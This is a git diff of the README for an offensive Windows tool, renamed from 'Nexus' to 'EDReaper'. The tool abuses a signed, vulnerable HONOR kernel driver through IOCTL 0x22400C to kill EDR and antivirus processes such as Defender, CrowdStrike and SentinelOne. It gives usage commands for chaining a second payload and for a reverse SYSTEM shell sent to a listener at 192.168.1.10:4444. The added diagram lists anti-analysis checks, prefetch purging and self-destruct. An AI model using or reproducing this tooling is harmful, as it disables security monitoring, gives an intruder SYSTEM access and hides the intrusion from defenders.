@@ -1,4 +1,4 @@
-# Nexus
+# EDReaper
 
 A cross-version Windows EDR/AV process terminator. It loads a signed,
 vulnerable HONOR kernel driver (`MonProcessEX.sys`), resolves the PID of
@@ -10,7 +10,7 @@ No kernel offsets, no PDB downloads, no build-specific shellcode: the same
 driver and the same IOCTL work identically on every Windows 10 and Windows
 11 build.
 
-Nexus is a single self-contained executable. The driver is embedded in the
+EDReaper is a single self-contained executable. The driver is embedded in the
 binary at compile time and extracted to `%TEMP%` at runtime, installed
 through the Service Control Manager, used to kill the targets, then stopped
 and deleted — leaving no persistent artifact behind. Targets are fully
@@ -20,41 +20,55 @@ built-in defaults.
 ## How it works
 
 ```
-+-------------------------------------------------------------------------------------------+
-| USER MODE                                                                                 |
-|                                                                                           |
-|   nexus.exe                                                                               |
-|                                                                                           |
-|   +-------------------+      +-------------------+      +---------------------+           |
-|   |   enumerate all   |      |   resolve target  |      |   match against     |           |
-|   |   running         |  ->  |   PID via process |  ->  |   target list,      |           |
-|   |   processes       |      |   entry           |      |   collect PIDs      |           |
-|   +-------------------+      +-------------------+      +----------+----------+           |
-|                                                                         |                 |
-|                             CreateFileW("\\.\MonProcessEX")             |                 |
-|                             DeviceIoControl(IOCTL 0x22400C)             |                 |
-|                             output = termination status                 v                 |
-+-------------------------------------------------------------------------------------------+
-| KERNEL MODE                                                                               |
-|                                                                                           |
-|   MonProcessEX.sys                                     signed HONOR kernel driver         |
-|   +---------------------------------------------------------------------------------+     |
-|   |   IOCTL 0x22400C  ->  PID termination dispatch                                  |     |
-|   |        |                                                                        |     |
-|   |        |  kernel-mode process lookup                                            |     |
-|   |        v                                                                        |     |
-|   |   EPROCESS located -> terminated from kernel context                            |     |
-|   |        |                                                                        |     |
-|   |        v                                                                        |     |
-|   |   process exit path invoked                                                     |     |
-|   +---------------------------------------------------------------------------------+     |
-|                                                                                           |
-|   CLEANUP                                                                                 |
-|   +---------------------------------------------------------------------------------+     |
-|   |   SCM service stopped and deleted                                               |     |
-|   |   driver unloaded, no persistent artifact                                       |     |
-|   +---------------------------------------------------------------------------------+     |
-+-------------------------------------------------------------------------------------------+
+┌─────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                   EDREAPER EXECUTION ARCHITECTURE                           │
+└─────────────────────────────────────────────────────────────────────────────────────────────┘
+                                                │
+ ┌──────────────────────────────────────────────▼────────────────────────────────────────────┐
+ │ [1] USER-MODE INITIALIZATION (edreaper.exe)                                               │
+ │                                                                                           │
+ │  ┌──────────────────┐      ┌─────────────────────────┐      ┌──────────────────────────┐  │
+ │  │ Elevation Check  │ ───► │  Anti-Analysis Check    │ ───► │ Drop MonProcessEX.sys    │  │
+ │  │ (TokenElevation) │      │  (VM / Debugger detect) │      │ to %TEMP%                │  │
+ │  └──────────────────┘      └─────────────────────────┘      └────────────┬─────────────┘  │
+ │                                                                          │                │
+ │  ┌──────────────────┐      ┌─────────────────────────┐      ┌────────────▼─────────────┐  │
+ │  │ Resolve Targets  │ ◄─── │ Process Enumeration     │ ◄─── │ Install & Start Service  │  │
+ │  │ (Match PIDs)     │      │ (Toolhelp32 Snapshot)   │      │ via SCM (SysSvc<RANDOM>) │  │
+ │  └────────┬─────────┘      └─────────────────────────┘      └──────────────────────────┘  │
+ │           │                                                                               │
+ │           ▼ [ Targets: MsMpEng.exe, csfalconservice.exe, SentinelAgent.exe, etc. ]        │
+ │  CreateFileW("\\.\MonProcessEX")                                                          │
+ │  DeviceIoControl(IOCTL 0x22400C, Target PID) ───────────────────────────┐                 │
+ └─────────────────────────────────────────────────────────────────────────┼─────────────────┘
+                                                                           │ IOCTL Dispatch
+ ┌─────────────────────────────────────────────────────────────────────────▼─────────────────┐
+ │ [2] KERNEL-MODE TERMINATION PRIMITIVE (MonProcessEX.sys - Signed HONOR Driver)            │
+ │                                                                                           │
+ │   IOCTL 0x22400C Dispatch ──► Kernel-Mode Process Lookup (Resolves EPROCESS by PID)       │
+ │                                             │                                             │
+ │                                             ▼                                             │
+ │   Kernel Exit Invocation  ──► Bypasses Protected Process Light (PPL) User-Mode Checks     │
+ │                                             │                                             │
+ │                                             ▼                                             │
+ │   Target EDR/AV Process Terminated Instantly from Ring 0 Context                          │
+ └─────────────────────────────────────────────────────────────────────────┬─────────────────┘
+                                                                           │ Targets Dead
+ ┌─────────────────────────────────────────────────────────────────────────▼─────────────────┐
+ │ [3] POST-EXPLOITATION (OPTIONAL STAGE 2)                                                  │
+ │                                                                                           │
+ │   ├── Duplicate SYSTEM Token (services.exe / lsass.exe) ──► Reverse SYSTEM Shell (-H/-P) │
+ │   └── Detached / Elevated Execution ──────────────────────► Chained Secondary Payload (-e)│
+ └─────────────────────────────────────────────────────────────────────────┬─────────────────┘
+                                                                           │ Teardown & Exit
+ ┌─────────────────────────────────────────────────────────────────────────▼─────────────────┐
+ │ [4] CLEANUP & ANTI-FORENSICS                                                              │
+ │                                                                                           │
+ │   ┌───────────────────────────┐    ┌───────────────────────────┐    ┌──────────────────┐  │
+ │   │ SCM Service Stopped &     │───►│ %TEMP%\*.sys Temp Driver  │───►│ Purge Prefetch & │  │
+ │   │ Deleted (No Trace in SCM) │    │ Deleted from Disk         │    │ Self-Destruct(-x)│  │
+ │   └───────────────────────────┘    └───────────────────────────┘    └──────────────────┘  │
+ └───────────────────────────────────────────────────────────────────────────────────────────┘
 ```
 
 The driver exposes a single kill IOCTL that terminates a process given its
@@ -84,11 +98,11 @@ Windows version changes.
 ## Quick start
 
 ```powershell
-# Build (or use a prebuilt nexus.exe)
+# Build (or use a prebuilt edreaper.exe)
 cargo build --release --target x86_64-pc-windows-gnu
 
 # Run from an elevated shell
-nexus.exe -n "notepad.exe,calc.exe"
+edreaper.exe -n "notepad.exe,calc.exe"
 ```
 
 Targets die, the driver unloads itself, and the service is removed. Done.
@@ -96,7 +110,7 @@ Targets die, the driver unloads itself, and the service is removed. Done.
 ## Usage
 
 ```
-nexus.exe [options]
+edreaper.exe [options]
 
   -s, --silent           suppress all console output
   -r, --repeat           keep running, re-check targets
@@ -150,7 +164,7 @@ cortex_agent.exe
 
 A template ships as `targets.example.conf`.
 
-**Command line.** `nexus.exe -n "MsMpEng.exe,csfalconservice.exe"`
+**Command line.** `edreaper.exe -n "MsMpEng.exe,csfalconservice.exe"`
 
 **Built-in defaults.** With no config and no flags:
 
@@ -166,16 +180,16 @@ A template ships as `targets.example.conf`.
 
 ## Post-execution chaining (Stage 2)
 
-Nexus can trigger a secondary payload, tool, or privilege-escalation binary
+EDReaper can trigger a secondary payload, tool, or privilege-escalation binary
 immediately after the target security processes are terminated and the
 driver has been safely unloaded and removed from SCM:
 
 ```powershell
 # Neutralize Defender/EDRs, then run a payload:
-nexus.exe -n "MsMpEng.exe,SenseIR.exe" -e "C:\path\to\rustpotato.exe -c whoami"
+edreaper.exe -n "MsMpEng.exe,SenseIR.exe" -e "C:\path\to\rustpotato.exe -c whoami"
 
 # Launch in background (detached):
-nexus.exe -e "C:\path\to\rustpotato.exe -c \"cmd.exe /c start-agent.bat\"" --detach
+edreaper.exe -e "C:\path\to\rustpotato.exe -c \"cmd.exe /c start-agent.bat\"" --detach
 ```
 
 Or configure it persistently in `targets.conf`:
@@ -188,12 +202,12 @@ exec = C:\path\to\rustpotato.exe -c whoami
 
 ## Reverse SYSTEM shell
 
-After the targets are dead and the driver is unloaded, Nexus can duplicate
+After the targets are dead and the driver is unloaded, EDReaper can duplicate
 a SYSTEM token from a privileged process (`services.exe`, `lsass.exe`, …)
 and spawn a shell piped back to your listener:
 
 ```powershell
-nexus.exe -n "MsMpEng.exe" -H 192.168.1.10 -P 4444 -c cmd.exe
+edreaper.exe -n "MsMpEng.exe" -H 192.168.1.10 -P 4444 -c cmd.exe
 ```
 
 Listener side (any netcat-compatible tool):
@@ -229,7 +243,7 @@ cargo build --release
 
 This uses the default host toolchain (MSVC on a standard Rust-for-Windows
 install). Requires the MSVC Build Tools (C++ workload).
-Output: `target\release\nexus.exe`.
+Output: `target\release\edreaper.exe`.
 
 If MSVC isn't your default toolchain:
 
@@ -250,7 +264,7 @@ The GNU target also needs a MinGW-w64 linker (`gcc`/`ld`). This is the path
 the CI workflow uses.
 
 The release profile enables LTO, a single codegen unit, and `panic = "abort"`.
-The driver is embedded via `include_bytes!`, so the output `nexus.exe` is
+The driver is embedded via `include_bytes!`, so the output `edreaper.exe` is
 fully self-contained.
 
 ## Credits
